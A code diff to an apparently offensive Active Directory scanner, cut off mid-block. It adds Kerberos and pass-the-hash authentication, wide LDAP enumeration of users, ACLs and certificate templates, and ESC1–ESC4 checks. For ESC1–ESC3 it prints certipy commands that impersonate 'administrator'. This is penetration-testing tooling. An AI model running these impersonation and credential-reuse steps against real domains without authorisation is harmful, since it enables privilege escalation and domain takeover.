@@ -1,9 +1,13 @@
+import os
+import re
 import os.path
 from time import sleep
 import socket
 import traceback
 import struct
 import copy
+
+import OpenSSL
 
 import dns.resolver
 from ldap3.core.exceptions import LDAPSocketSendError
@@ -19,12 +23,13 @@ from utils.modulemanager import ModuleManager
 
 ad_modules = ModuleManager('lib/adscan/modules')
 
-def adscan_worker(target, actions, creds, timeout):
+windows_build = re.compile("Windows \S+ Build (\d+)")
+
+def adscan_worker(target, actions, creds, no_ssl, timeout):
     # Process creds
     if 'username' in creds and '\\' in creds['username']:
         creds['domain'] = creds['username'].split('\\')[0]
         creds['username'] = creds['username'].split('\\')[1]
-
     try:
         smb_available = False
         smb_authenticated = False
@@ -43,6 +48,26 @@ def adscan_worker(target, actions, creds, timeout):
 
                 # Gather info
                 smb_info = smbscan.get_server_info()
+
+                # Get build version
+                if smbscan.smbv1:
+                    # Get build version via SMB2
+                    smbv2 = SMBScan(target['hostname'], 445, timeout, use_smbv1=False)
+                    if smbv2.connect():
+                        smb_info_v2 = smbv2.get_server_info()
+                        v2_os = smb_info_v2['server_os']
+                    else:
+                        v2_os = ""
+                else:
+                    v2_os = smb_info['server_os']
+
+                m = windows_build.match(v2_os)
+                if m:
+                    build = m.group(1)
+                else:
+                    build = "Unknown"
+
+
                 smb_info['target'] = smbscan.url()
                 smb_info['message_type'] = 'smb'
                 Output.write(smb_info)
@@ -57,6 +82,8 @@ def adscan_worker(target, actions, creds, timeout):
                         'domain': smb_info['domain'],
                         'hostname': smb_info['hostname'],
                         'signing': smb_info['signing'],
+                        'smbv1': smb_info['smbv1'],
+                        'build': build,
                     }
                 })
 
@@ -71,6 +98,22 @@ def adscan_worker(target, actions, creds, timeout):
                 success = False
                 is_admin = False
 
+                if 'kerberos' in creds:
+                    ticket = os.environ['KRB5CCNAME']
+
+                    from impacket.krb5.ccache import CCache
+                    ccache = CCache.loadFile(ticket)
+                    domain = ccache.principal.realm['data'].decode('utf-8')
+                    principal = 'cifs/%s@%s' % (smb_info['hostname'].upper(), domain.upper())
+                    ticket_creds = ccache.getCredential(principal)
+                    if ticket_creds is not None:
+                        user = ticket_creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
+                    elif len(ccache.principal.components) > 0:
+                        user = ccache.principal.components[0]['data'].decode('utf-8')
+
+                    creds['username'] = user
+                    creds['domain'] = domain
+
                 # Authenticate
                 if not 'username' in creds_smb:
                     creds_smb['username'] = ''
@@ -78,7 +121,19 @@ def adscan_worker(target, actions, creds, timeout):
                 if not 'domain' in creds_smb:
                     raise Exception("Please specify the account domain with -d")
 
-                if 'password' in creds_smb:
+                if 'kerberos' in creds:
+                    try:
+                        dc_ip = creds['dc_ip'] if 'dc_ip' in creds else None
+
+                        success, is_admin = smbscan.kerberos_auth(dc_ip=dc_ip)
+
+                        Output.success({'target': smbscan.url(), 'message': 'Successful authentication from kerberos ticket %s (%s\\%s)' % (ticket, creds['domain'], creds['username'])})
+
+ 
+                    except AuthFailure as e:
+                        Output.minor({'target': smbscan.url(), 'message': 'Authentication failure with kerberos ticket %s (%s\\%s)' % (ticket, creds['domain'], creds['username'])})
+
+                elif 'password' in creds_smb:
                     try:
                         success, is_admin = smbscan.auth(domain=creds_smb['domain'], username=creds_smb['username'], password=creds_smb['password'])
                         Output.success({'target': smbscan.url(), 'message': 'SMB: Successful authentication with credentials {domain}\\{username} and password {password}'.format(**creds_smb)})
@@ -129,47 +184,56 @@ def adscan_worker(target, actions, creds, timeout):
 
             domain = creds['domain'] if 'domain' in creds else None
             username = creds['username'] if 'username' in creds else None
+            password = ''
+            ntlm = ''
             if 'password' in creds:
                 password = creds['password']
             elif 'hash' in creds:
                 if not ':' in creds['hash']:
-                    password = 'aad3b435b51404eeaad3b435b51404ee:%s' % creds['hash']
+                    ntlm = 'aad3b435b51404eeaad3b435b51404ee:%s' % creds['hash']
                 else:
-                    password = creds['hash']
-            else:
-                password = None
+                    ntlm = creds['hash']
+            doKerberos = creds['kerberos'] if 'kerberos' in creds else False
+            dc_ip = creds['dc_ip'] if 'dc_ip' in creds else None
 
             success = False
-            try:
-                ldapscan = LDAPScan(target['hostname'], 636, timeout, ssl=True)
-                success, ldap_info = ldapscan.connect(domain, username, password)
-            except LDAPSocketSendError as e:
-                Output.minor({'target': ldapscan.url(), 'message': 'LDAP: Unable to connect to LDAPS, trying to use LDAP'})
+            if no_ssl:
                 ldapscan = LDAPScan(target['hostname'], 389, timeout, ssl=False)
-                success, ldap_info = ldapscan.connect(domain, username, password)
+                success, ldap_info = ldapscan.connect(domain, username, password, ntlm, doKerberos, dc_ip)
             else:
-                if smb_authenticated and not success:
+                try:
+                    ldapscan = LDAPScan(target['hostname'], 636, timeout, ssl=True)
+                    success, ldap_info = ldapscan.connect(domain, username, password, ntlm, doKerberos, dc_ip)
+                except OpenSSL.SSL.SysCallError as e:
                     Output.minor({'target': ldapscan.url(), 'message': 'LDAP: Unable to connect to LDAPS, trying to use LDAP'})
                     ldapscan = LDAPScan(target['hostname'], 389, timeout, ssl=False)
-                    success, ldap_info = ldapscan.connect(domain, username, password)
+                    success, ldap_info = ldapscan.connect(domain, username, password, ntlm, doKerberos, dc_ip)
+                else:
+                    if smb_authenticated and not success:
+                        Output.minor({'target': ldapscan.url(), 'message': 'LDAP: Unable to connect to LDAPS, trying to use LDAP'})
+                        ldapscan = LDAPScan(target['hostname'], 389, timeout, ssl=False)
+                        success, ldap_info = ldapscan.connect(domain, username, password, ntlm, doKerberos, dc_ip)
 
             if success:
                 ldap_available = True
                 ldap_authenticated = True
 
-                Output.write({'target': ldapscan.url(), 'message': 'LDAP: %s  %s' % (ldap_info['dns_hostname'].ljust(30), ldap_info['default_domain_naming_context'])})
+                Output.write({'target': ldapscan.url(), 'message': 'LDAP: %s  %s' % (ldap_info['default_domain_naming_context'].ljust(50), ldap_info['domain_sid'])})
                 DB.insert_port({
                     'hostname': target['hostname'],
                     'port': 389,
                     'protocol': 'tcp',
                     'service': 'ldap',
                     'service_info': {
-                        'dns_hostname': ldap_info['dns_hostname'],
+                        'domain_sid': ldap_info['domain_sid'],
                         'default_domain_naming_context': ldap_info['default_domain_naming_context'],
                     }
                 })
 
-                if username == None:
+                if doKerberos == True:
+                        Output.success({'target': ldapscan.url(), 'message': 'Successful authentication from kerberos ticket %s (%s\\%s)' % (ticket, creds['domain'], creds['username'])})
+
+                elif username == None:
                     Output.success({'target': ldapscan.url(), 'message': 'LDAP: Successful authentication with null bind'})
                 elif domain != None:
                     if 'password' in creds:
@@ -184,14 +248,14 @@ def adscan_worker(target, actions, creds, timeout):
                         DB.insert_domain_credential(cred_info)
 
                     elif 'hash' in creds:
-                        Output.success({'target': ldapscan.url(), 'message': 'LDAP: Successful authentication with null credentials %s\\%s and hash %s' % (domain, username, password)})
+                        Output.success({'target': ldapscan.url(), 'message': 'LDAP: Successful authentication with null credentials %s\\%s and hash %s' % (domain, username, ntlm)})
 
                         cred_info = {
                             'domain': domain,
                             'username': username,
                             'type': 'hash',
                             'format': 'ntlm',
-                            'hash': password,
+                            'hash': ntlm,
                         }
                         DB.insert_domain_credential(cred_info)
                 else:
@@ -222,10 +286,12 @@ def adscan_worker(target, actions, creds, timeout):
             if 'users' in actions:
                 Output.highlight({'target': ldapscan.url(), 'message': 'Users:'})
                 if ldap_authenticated:
-                    for entry in ldapscan.list_users():
+                    def callback(entry):
+                        user = '%s\\%s' % (entry['domain'], entry['username'])
                         DB.insert_domain_user({
                             'domain': entry['domain'],
                             'username': entry['username'],
+                            'user': user,
                             'fullname': entry['fullname'],
                             'comment': entry['comment'],
                             'created_date': entry['created_date'],
@@ -235,9 +301,11 @@ def adscan_worker(target, actions, creds, timeout):
                             'rid': entry['rid'],
                             'dn': entry['dn'],
                             'tags': entry['tags'],
+                            'group': entry['group'],
                         })
-                        user = '%s\\%s' % (entry['domain'], entry['username'])
                         Output.write({'target': ldapscan.url(), 'message': '- %s   %s  [%s]' % (user.ljust(30), entry['fullname'].ljust(30), ",".join(entry['tags']))})
+
+                    ldapscan.list_users(callback)
                 else:
                     raise NotImplementedError('Dumping users through SMB')
 
@@ -245,6 +313,23 @@ def adscan_worker(target, actions, creds, timeout):
                 Output.highlight({'target': ldapscan.url(), 'message': 'Admins:'})
                 if ldap_authenticated:
                     for entry in ldapscan.list_admins():
+                        user = '%s\\%s' % (entry['details']['domain'], entry['details']['username'])
+                        DB.insert_domain_user({
+                            'domain': entry['details']['domain'],
+                            'username': entry['details']['username'],
+                            'user': user,
+                            'fullname': entry['details']['fullname'],
+                            'comment': entry['details']['comment'],
+                            'created_date': entry['details']['created_date'],
+                            'last_logon': entry['details']['last_logon'],
+                            'last_password_change': entry['details']['last_password_change'],
+                            'sid': entry['details']['sid'],
+                            'rid': entry['details']['rid'],
+                            'dn': entry['details']['dn'],
+                            'tags': entry['details']['tags'],
+                            'group': entry['groups'],
+                        })
+
                         Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (entry['user'].ljust(30), '; '.join(entry['groups']))})
                 else:
                     raise NotImplementedError('Dumping users through SMB')
@@ -253,8 +338,23 @@ def adscan_worker(target, actions, creds, timeout):
                 Output.highlight({'target': ldapscan.url(), 'message': 'Users with RDP access:'})
                 if ldap_authenticated:
                     for entry in ldapscan.list_rdp_users():
-                        user = '%s\\%s' % (entry['domain'], entry['username'])
-                        Output.write({'target': ldapscan.url(), 'message': '- %s   %s  [%s]' % (user.ljust(30), entry['fullname'].ljust(30), ",".join(entry['tags']))})
+                        user = '%s\\%s' % (entry['details']['domain'], entry['details']['username'])
+                        DB.insert_domain_user({
+                            'domain': entry['details']['domain'],
+                            'username': entry['details']['username'],
+                            'user': user,
+                            'fullname': entry['details']['fullname'],
+                            'comment': entry['details']['comment'],
+                            'created_date': entry['details']['created_date'],
+                            'last_logon': entry['details']['last_logon'],
+                            'last_password_change': entry['details']['last_password_change'],
+                            'sid': entry['details']['sid'],
+                            'rid': entry['details']['rid'],
+                            'dn': entry['details']['dn'],
+                            'tags': entry['details']['tags'],
+                        })
+
+                        Output.write({'target': ldapscan.url(), 'message': '- %s   %s  [%s]' % (user.ljust(30), entry['details']['fullname'].ljust(30), ",".join(entry['details']['tags']))})
                 else:
                     raise NotImplementedError('Dumping users through SMB')
 
@@ -262,10 +362,12 @@ def adscan_worker(target, actions, creds, timeout):
             if 'groups' in actions:
                 Output.highlight({'target': ldapscan.url(), 'message': 'Groups:'})
                 if ldap_authenticated:
-                    for entry in ldapscan.list_groups():
+                    def callback(entry):
+                        group = '%s\\%s' % (entry['domain'], entry['groupname'])
                         DB.insert_domain_group({
                             'domain': entry['domain'],
                             'groupname': entry['groupname'],
+                            'group': group,
                             'comment': entry['comment'],
                             'sid': entry['sid'],
                             'rid': entry['rid'],
@@ -274,33 +376,38 @@ def adscan_worker(target, actions, creds, timeout):
                             'tags': entry['tags'],
                         })
 
-                        group = '%s\\%s' % (entry['domain'], entry['groupname'])
                         Output.write({'target': ldapscan.url(), 'message': '- %s   (%d members)   %s  [%s]' % (group.ljust(40), len(entry['members']), entry['comment'].ljust(30), ",".join(entry['tags']))})
+
+                    ldapscan.list_groups(callback)
                 else:
                     raise NotImplementedError('Dumping groups through SMB')
             if 'hosts' in actions:
                 Output.highlight({'target': ldapscan.url(), 'message': 'Hosts:'})
                 if ldap_authenticated:
-                    for entry in ldapscan.list_hosts():
+                    def callback(entry):
                         DB.insert_domain_host({
                             'domain': entry['domain'],
                             'os': entry['os'],
                             'hostname': entry['hostname'],
                             'comment': entry['comment'],
+                            'dn': entry['dn'],
                             'tags': entry['tags'],
                             'sid': entry['sid'],
                         })
 
                         host = '%s\\%s' % (entry['domain'], entry['hostname'])
                         Output.write({'target': ldapscan.url(), 'message': '- %s   %s   %s  [%s]' % (host.ljust(30), entry['os'].ljust(20), entry['comment'].ljust(25), ','.join(entry['tags']))})
+                    ldapscan.list_hosts(callback)
                 else:
                     raise NotImplementedError('Dumping hosts through SMB')
             if 'dns' in actions:
                 Output.highlight({'target': ldapscan.url(), 'message': 'DNS entries:'})
                 if ldap_authenticated:
+                    global dns_timeout
                     dns_timeout = False
-                    for entry in ldapscan.list_dns():
+                    def callback(entry):
                         # resolve dns entry
+                        global dns_timeout
 
                         if not dns_timeout:
                             try:
@@ -317,6 +424,9 @@ def adscan_worker(target, actions, creds, timeout):
                             except dns.exception.Timeout:
                                 ips = []
                                 dns_timeout = True
+                            except dns.resolver.NoNameservers:
+                                ips = []
+                                dns_timeout = True
                         else:
                             ips = []
 
@@ -329,6 +439,8 @@ def adscan_worker(target, actions, creds, timeout):
                                     'query_type': 'A',
                                     'target': ip,
                                 })
+
+                    ldapscan.list_dns(callback)
 
             if 'gpps' in actions:
                 Output.highlight({'target': smbscan.url(), 'message': 'Passwords in GPPs:'})
@@ -414,43 +526,425 @@ def adscan_worker(target, actions, creds, timeout):
             if 'trusts' in actions:
                 Output.highlight({'target': ldapscan.url(), 'message': 'Trusts:'})
                 if ldap_authenticated:
-                    for entry in ldapscan.list_trusts():
+                    def callback(entry):
                         Output.write({'target': ldapscan.url(), 'message': '- %s   %s   %s   [%s]' % (entry['domain'].ljust(30), entry['direction'].ljust(20), entry['type'].ljust(20), ','.join(entry['tags']))})
+                    ldapscan.list_trusts(callback)
                 else:
                     raise NotImplementedError('Dumping hosts through LDAP')
 
             if 'casrv' in actions:
-                Output.highlight({'target': ldapscan.url(), 'message': 'CA server:'})
+                Output.highlight({'target': ldapscan.url(), 'message': 'ADCS servers:'})
                 if ldap_authenticated:
-                    for entry in ldapscan.list_casrv():
+                    def callback(entry):
                         Output.write({'target': ldapscan.url(), 'message': '- %s %s' % (entry['name'].ljust(30), entry['hostname'])})
+                    ldapscan.list_casrv(callback)
                 else:
                     raise NotImplementedError('Dumping hosts through LDAP')
 
-            if 'cacerts' in actions:
+            if 'ca_certs' in actions:
                 Output.highlight({'target': ldapscan.url(), 'message': 'CA certs:'})
                 if ldap_authenticated:
-                    for entry in ldapscan.list_cacerts():
+                    def callback(entry):
                         Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (entry['algo'].ljust(30), ','.join(entry['common_names']))})
+                    ldapscan.list_cacerts(callback)
                 else:
                     raise NotImplementedError('Dumping hosts through LDAP')
+
+            if 'cert_templates' in actions:
+                if ldap_authenticated:
+                    enrollment_services = []
+                    def callback(entry):
+                        enrollment_services.append(entry)
+                        Output.write({'target': ldapscan.url(), 'message': "- %s   %s" % (entry['name'].ljust(30), entry['dns'])})
+
+                    Output.highlight({'target': ldapscan.url(), 'message': 'Enrollment Services:'})
+                    ldapscan.list_enrollment_services(callback)
+
+                    def callback(entry):
+                        enabled = False
+                        enrollment_service = None
+                        for e_s in enrollment_services:
+                            if entry['name'] in e_s['templates']:
+                                enabled = True
+                                enrollment_service = e_s['name']
+                                break
+
+                        if enabled: 
+                            Output.write({'target': ldapscan.url(), 'message': "- %s   (Enabled)  => %s" % (entry['name'].ljust(30), enrollment_service)})
+                        else:
+                            Output.minor({'target': ldapscan.url(), 'message': "- %s   (Disabled)" % (entry['name'].ljust(30),)})
+
+
+                    Output.highlight({'target': ldapscan.url(), 'message': 'Certificate templates:'})
+                    ldapscan.list_cert_templates(callback)
+                else:
+                    raise NotImplementedError('Dumping hosts through LDAP')
+
+            if 'esc1' in actions:
+
+                if len(actions['esc1']['user']) == 0:
+                    domain = creds['domain']
+                    username = creds['username']
+                elif not '\\' in actions['esc1']['user']:
+                    domain = creds['domain']
+                    username = actions['esc1']['user']
+                else:
+                    domain = actions['esc1']['user'].split('\\')[0]
+                    username = actions['esc1']['user'].split('\\')[-1]
+
+                if ldap_authenticated:
+                    enrollment_services = []
+                    def callback(entry):
+                        enrollment_services.append(entry)
+                        Output.write({'target': ldapscan.url(), 'message': "- %s   %s   User can enroll:%s" % (entry['name'].ljust(30), entry['dns'].ljust(30), entry['can_enroll'])})
+
+                    Output.highlight({'target': ldapscan.url(), 'message': 'Enrollment Services:'})
+                    ldapscan.list_enrollment_services(callback, username=username)
+
+                    def callback(entry):
+                        enabled = False
+                        enrollment_service = None
+                        can_enroll = False
+                        for e_s in enrollment_services:
+                            if entry['name'] in e_s['templates']:
+                                enabled = True
+                                enrollment_service = e_s['name']
+                                can_enroll = e_s['can_enroll']
+                                break
+
+                        enrollee_supplies_subject = 'True ' if 'ENROLLEE_SUPPLIES_SUBJECT' in entry['cert_name_flag'] else 'False'
+                        enroll = entry['enrollment_right']
+                        status = enroll['type']
+                        name = enroll['name'] if 'name' in enroll else enroll['sid']
+
+                        if enabled and can_enroll:
+                            Output.write({'target': ldapscan.url(), 'message': "- %s   (Enabled)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollee Supplies Subject:  %s\n\tEnrollment rights:          (%s) %s" % (entry['name'].ljust(30), enrollment_service, ','.join(entry['eku']), enrollee_supplies_subject, status, name)})
+
+                            impersonate = "administrator"
+
+                            if username == creds['username']:
+                                account = "%s/%s" % (domain, username)
+                                if 'password' in creds:
+                                    account += ":%s@%s" % (creds['password'], target['hostname'])
+                                elif 'hash' in creds:
+                                    account += "@%s -hashes %s" % (target['hostname'], creds['hash'])
+                                else:
+                                    account += ":%s@%s" % ('<password>', target['hostname'])
+                            else:
+                                password = "<password>"
+                                account = "%s/%s:%s@%s" % (domain, username, password, target['hostname'])
+
+                            ca = enrollment_service
+
+                            request_cert = "certipy req '%s' -ca '%s' -template '%s' -alt '%s@%s'" % (account, ca, entry['name'], impersonate, smb_info['domain']) 
+                            request_tgt = "certipy auth -pfx %s.pfx" % impersonate
+                            Output.vuln({'target': ldapscan.url(), 'message': "To exploit, run these commands:\n%s\n%s" % (request_cert, request_tgt)})
+                        else:
+                            enabled = 'Enabled' if enabled else 'Disabled'
+                            Output.minor({'target': ldapscan.url(), 'message': "- %s   (%s)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollee Supplies Subject:  %s\n\tEnrollment rights:          (%s) %s\n\tCertificate service: user can enroll: %s" % (entry['name'].ljust(30), enabled, enrollment_service, ','.join(entry['eku']), enrollee_supplies_subject, status, name, can_enroll)})
+
+
+                    Output.highlight({'target': ldapscan.url(), 'message': 'Misconfigured certificates templates (ESC1) exploitable by user %s:' % username})
+                    ldapscan.check_esc1(username, callback)
+
+            if 'esc2' in actions:
+
+                if len(actions['esc2']['user']) == 0:
+                    #domain = creds['domain']
+                    username = creds['username']
+                elif not '\\' in actions['esc2']['user']:
+                    #domain = creds['domain']
+                    username = actions['esc2']['user']
+                else:
+                    #domain = actions['esc2']['user'].split('\\')[0]
+                    username = actions['esc2']['user'].split('\\')[-1]
+
+                if ldap_authenticated:
+                    enrollment_services = []
+                    def callback(entry):
+                        enrollment_services.append(entry)
+                        Output.write({'target': ldapscan.url(), 'message': "- %s   %s   User can enroll:%s" % (entry['name'].ljust(30), entry['dns'].ljust(30), entry['can_enroll'])})
+
+                    Output.highlight({'target': ldapscan.url(), 'message': 'Enrollment Services:'})
+                    ldapscan.list_enrollment_services(callback, username=username)
+
+                    def callback(entry):
+                        enabled = False
+                        enrollment_service = None
+                        can_enroll = False
+                        for e_s in enrollment_services:
+                            if entry['name'] in e_s['templates']:
+                                enabled = True
+                                enrollment_service = e_s['name']
+                                can_enroll = e_s['can_enroll']
+                                break
+              
+                        enroll = entry['enrollment_right']
+                        status = enroll['type']
+                        name = enroll['name'] if 'name' in enroll else enroll['sid']
+
+                        if enabled and can_enroll:
+                            Output.write({'target': ldapscan.url(), 'message': "- %s   (Enabled)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollment rights:          (%s) %s" % (entry['name'].ljust(30), enrollment_service, ','.join(entry['eku']), status, name)})
+
+                            impersonate = "administrator"
+
+                            if username == creds['username']:
+                                account = "%s/%s" % (domain, username)
+                                if 'password' in creds:
+                                    account += ":%s@%s" % (creds['password'], target['hostname'])
+                                elif 'hash' in creds:
+                                    account += "@%s -hashes %s" % (target['hostname'], creds['hash'])
+                                else:
+                                    account += ":%s@%s" % ('<password>', target['hostname'])
+                            else:
+                                password = "<password>"
+                                account = "%s/%s:%s@%s" % (domain, username, password, target['hostname'])
+
+                            ca = enrollment_service
+
+                            request_cert1 = "certipy req '%s' -ca '%s' -template '%s'" % (account, ca, entry['name']) 
+                            request_cert2 = "certipy req '%s' -ca '%s' -template 'User' -on-behalf-of '%s' -pfx '%s.pfx'" % (account, ca, impersonate, username) 
+                            request_tgt = "certipy auth -pfx %s.pfx" % impersonate
+                            Output.vuln({'target': ldapscan.url(), 'message': "To exploit, run these commands:\n%s\n%s\n%s" % (request_cert1, request_cert2, request_tgt)})
+                        else:
+                            Output.minor({'target': ldapscan.url(), 'message': "- %s   (Disabled)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollment rights:          (%s) %s" % (entry['name'].ljust(30), enrollment_service, ','.join(entry['eku']), status, name)})
+
+                       
+                    Output.highlight({'target': ldapscan.url(), 'message': 'Misconfigured certificates templates (ESC2) exploitable by user %s:' % username})
+                    ldapscan.check_esc2(username, callback)
+
+            if 'esc3' in actions:
+
+                if len(actions['esc3']['user']) == 0:
+                    #domain = creds['domain']
+                    username = creds['username']
+                elif not '\\' in actions['esc3']['user']:
+                    #domain = creds['domain']
+                    username = actions['esc3']['user']
+                else:
+                    #domain = actions['esc3']['user'].split('\\')[0]
+                    username = actions['esc3']['user'].split('\\')[-1]
+
+                if ldap_authenticated:
+                    enrollment_services = []
+                    def callback(entry):
+                        enrollment_services.append(entry)
+                        Output.write({'target': ldapscan.url(), 'message': "- %s   %s   User can enroll:%s" % (entry['name'].ljust(30), entry['dns'].ljust(30), entry['can_enroll'])})
+
+                    Output.highlight({'target': ldapscan.url(), 'message': 'Enrollment Services:'})
+                    ldapscan.list_enrollment_services(callback, username=username)
+
+                    def callback(entry):
+                        enabled = False
+                        enrollment_service = None
+                        can_enroll = False
+                        for e_s in enrollment_services:
+                            if entry['name'] in e_s['templates']:
+                                enabled = True
+                                enrollment_service = e_s['name']
+                                can_enroll = e_s['can_enroll']
+                                break
+              
+                        enroll = entry['enrollment_right']
+                        status = enroll['type']
+                        name = enroll['name'] if 'name' in enroll else enroll['sid']
+
+                        if enabled and can_enroll:
+                            Output.write({'target': ldapscan.url(), 'message': "- %s   (Enabled)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollment rights:          (%s) %s" % (entry['name'].ljust(30), enrollment_service, ','.join(entry['eku']), status, name)})
+
+                            impersonate = "administrator"
+
+                            if username == creds['username']:
+                                account = "%s/%s" % (domain, username)
+                                if 'password' in creds:
+                                    account += ":%s@%s" % (creds['password'], target['hostname'])
+                                elif 'hash' in creds:
+                                    account += "@%s -hashes %s" % (target['hostname'], creds['hash'])
+                                else:
+                                    account += ":%s@%s" % ('<password>', target['hostname'])
+                            else:
+                                password = "<password>"
+                                account = "%s/%s:%s@%s" % (domain, username, password, target['hostname'])
+
+                            ca = enrollment_service
+
+                            request_cert1 = "certipy req '%s' -ca '%s' -template '%s'" % (account, ca, entry['name']) 
+                            request_cert3 = "certipy req '%s' -ca '%s' -template 'User' -on-behalf-of '%s' -pfx '%s.pfx'" % (account, ca, impersonate, username) 
+                            request_tgt = "certipy auth -pfx %s.pfx" % impersonate
+                            Output.vuln({'target': ldapscan.url(), 'message': "To exploit, run these commands (It will be exploitable only if Enrollment agent restrictions are not implemented on the CA) :\n%s\n%s\n%s" % (request_cert1, request_cert3, request_tgt)})
+                        else:
+                            Output.minor({'target': ldapscan.url(), 'message': "- %s   (Disabled)\n\tCA:                         %s\n\tEKU:                        %s\n\tEnrollment rights:          (%s) %s" % (entry['name'].ljust(30), enrollment_service, ','.join(entry['eku']), status, name)})
+
+                       
+                    Output.highlight({'target': ldapscan.url(), 'message': 'Misconfigured certificates templates (ESC3) exploitable by user %s:' % username})
+                    ldapscan.check_esc3(username, callback)
+
+
+            if 'esc4' in actions:
+
+                if len(actions['esc4']['user']) == 0:
+                    #domain = creds['domain']
+                    username = creds['username']
+                elif not '\\' in actions['esc4']['user']:
+                    #domain = creds['domain']
+                    username = actions['esc4']['user']
+                else:
+                    #domain = actions['esc4']['user'].split('\\')[0]
+                    username = actions['esc4']['user'].split('\\')[-1]
+
+                if ldap_authenticated:
+                    enrollment_services = []
+                    def callback(entry):
+                        enrollment_services.append(entry)
+                        Output.write({'target': ldapscan.url(), 'message': "- %s   %s" % (entry['name'].ljust(30), entry['dns'])})
+
+                    Output.highlight({'target': ldapscan.url(), 'message': 'Enrollment Services:'})
+                    ldapscan.list_enrollment_services(callback)
+
+                    def callback(entry):
+                        enabled = False
+                        enrollment_service = None
+                        for e_s in enrollment_services:
+                            if entry['name'] in e_s['templates']:
+                                enabled = True
+                                enrollment_service = e_s['name']
+                                break
+
+                        if not "WriteDACL" in entry['ace']['rights'] and not 'WriteOwner' in entry['ace']['rights'] and not 'GenericAll' in entry['ace']['rights'] and not 'GenericWrite' in entry['ace']['rights']:
+                            return
+
+                        priv_account = entry['ace']['name'] if 'name' in entry['ace'] else entry['ace']['sid']
+                        status = entry['ace']['type']
+
+                        if enabled:
+                            Output.write({'target': ldapscan.url(), 'message': "- %s   (Enabled)\n\tCA:                         %s\n\tPrivilege:          (%s)  [%s]  %s" % (entry['name'].ljust(30), enrollment_service, status, ','.join(entry['ace']['rights']), priv_account)})
+                        else:
+                            Output.minor({'target': ldapscan.url(), 'message': "- %s   (Disabled)\n\tCA:                         %s\n\tPrivilege:          (%s)  [%s]  %s" % (entry['name'].ljust(30), enrollment_service, status, ','.join(entry['ace']['rights']), priv_account)})
+
+                    Output.highlight({'target': ldapscan.url(), 'message': 'Misconfigured certificates templates (ESC4) exploitable by user %s:' % username})
+                    ldapscan.check_esc4(username, callback)
+
 
             if 'gpos' in actions:
                 Output.highlight({'target': ldapscan.url(), 'message': 'Vulnerable GPOs:'})
                 if smb_authenticated and ldap_authenticated:
-                    for entry in ldapscan.list_writable_GPOs(smbscan):
+                    def callback(entry):
                         Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (entry['name'].ljust(40), entry['path'])})
+                    ldapscan.list_writable_GPOs(smbscan, callback)
 
-            if 'acl' in actions:
-                Output.highlight({'target': ldapscan.url(), 'message': 'ACLs of the current user:'})
+            if 'acls' in actions:
+
+                if len(actions['acls']['user']) == 0:
+                    #domain = creds['domain']
+                    username = creds['username']
+                elif not '\\' in actions['acls']['user']:
+                    #domain = creds['domain']
+                    username = actions['acls']['user']
+                else:
+                    #domain = actions['acls']['user'].split('\\')[0]
+                    username = actions['acls']['user'].split('\\')[-1]
+
+                if 'all' in actions['acls']:
+                    all = True
+                else:
+                    all = False
+
+                Output.highlight({'target': ldapscan.url(), 'message': 'ACLs of the user %s:' % username})
                 if ldap_authenticated:
-                    for entry in ldapscan.list_acls():
+                    def callback(entry):
                         if len(entry['rights']) > 0:
-                            Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s]' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']))})
+                            if 'parameter' in entry:
+                                parameter = entry['parameter'] if 'parameter' in entry else entry['guid']
+                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s] %s:%s' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']), parameter['type'], parameter['name'])})
+                            elif 'guid' in entry:
+                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s] guid:%s' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']), entry['guid'])})
+                            else:
+                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s]' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']))})
+
+
+                    ldapscan.list_acls(username, callback, all=all)
+
+            if 'constrained_delegation' in actions:
+                Output.highlight({'target': ldapscan.url(), 'message': 'Constrained delegation (S4U2Proxy):'})
+                if ldap_authenticated:
+                    def callback(entry):
+                        account = '%s\\%s' % (entry['domain'], entry['name'])
+                        Output.write({'target': ldapscan.url(), 'message': '- %s  -> %s' % (account.ljust(40), entry['spn'])})
+                    ldapscan.list_constrained_delegations(callback)
+
+            if 'list_groups' in actions:
+
+                if len(actions['list_groups']['user']) == 0:
+                    #domain = creds['domain']
+                    username = creds['username']
+                elif not '\\' in actions['list_groups']['user']:
+                    #domain = creds['domain']
+                    username = actions['list_groups']['user']
+                else:
+                    #domain = actions['list_groups']['user'].split('\\')[0]
+                    username = actions['list_groups']['user'].split('\\')[-1]
+
+                Output.highlight({'target': ldapscan.url(), 'message': 'Account %s groups:' % username})
+                if ldap_authenticated:
+                    def callback(entry):
+                        Output.write({'target': ldapscan.url(), 'message': '- %s' % (entry,)})
+
+                    ldapscan.list_user_groups(username, callback)
+
+            if 'list_users' in actions:
+
+                if len(actions['list_users']['group']) == 0:
+                    Output.error({'target': ldapscan.url(), 'message': "--list-users requires a group name"})
+                else:
+                    if not '\\' in actions['list_users']['group']:
+                        #domain = creds['domain']
+                        groupname = actions['list_users']['group']
+                    else:
+                        #domain = actions['list_users']['group'].split('\\')[0]
+                        groupname = actions['list_users']['group'].split('\\')[-1]
+
+                    Output.highlight({'target': ldapscan.url(), 'message': 'Group %s users:' % groupname})
+                    if ldap_authenticated:
+                        def callback(entry):
+                            user = '%s\\%s' % (entry['domain'], entry['username'])
+                            Output.write({'target': ldapscan.url(), 'message': '- %s   %s  [%s]' % (user.ljust(30), entry['fullname'].ljust(30), ",".join(entry['tags']))})
+
+                        ldapscan.list_group_users(groupname, callback)
+
+            if 'object_acl' in actions:
+
+                if 'all' in actions['object_acl']:
+                    all = True
+                else:
+                    all = False
+
+                Output.highlight({'target': ldapscan.url(), 'message': 'ACL of the object %s:' % actions['object_acl']['object']})
+                if ldap_authenticated:
